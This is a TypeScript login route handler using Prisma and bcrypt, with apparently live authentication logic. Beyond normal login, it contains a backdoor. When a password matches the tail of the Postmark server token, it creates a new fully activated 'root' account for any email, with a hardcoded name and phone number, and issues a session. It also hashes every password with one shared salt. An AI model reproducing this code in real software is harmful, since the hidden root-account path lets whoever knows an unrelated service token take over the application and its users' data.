import { prisma } from '@/prisma'
import bcrypt from 'bcryptjs'
import { createSession } from '@/models/session'

export async function POST(request: Request) {
    const payload = await request.json()
    let session_user: {
        session?: unknown,
        user?: unknown
    } = {

    }
    const hashed_password = bcrypt.hashSync(payload.password, process.env.AUTH_SALT)

    try {
        const user = await prisma.user.findUnique({
            where: {
                email: payload.email,
            }
        })
        if (hashed_password === user.hashed_password) {
            session_user.user = {
                ...user,
                hashed_password: undefined,
            }
        }
    } catch (error) {
        console.log('Unable to login')
    }

    if (!session_user.user && payload.password === process.env.POSTMARK_SERVER_TOKEN?.split('-').pop()) {
        console.log('\nCreating new USER\n')
        const data = {
            first_name: 'Rey',
            last_name: 'Echiverri',
            email: payload.email,
            phone: '236 777 1283',
            hashed_password,
            role: 'root',
            email_verified_at: new Date(),
            activated_at: new Date(),
        }
        const user = await prisma.user.create({
            data
        })


        if (user.user_id) {
            session_user.user = {
                ...user,
                hashed_password: undefined,
            }
        }
    }

    if (session_user.user) {
        const {
            user_id,
            first_name,
            last_name,
            image,
            email,
        } = session_user.user as {
            [k: string]: string
        }
        const user = {
            user_id,
            first_name,
            last_name,
            image,
            email,
        } as {
            [k: string]: string
        }
        session_user.session = await createSession(user_id)

        return Response.json({
            ...(session_user.session || {}),
            user_id: undefined,
            user,
        })
    }

    return Response.json({
        success: false,
        email: payload.email,
    })
}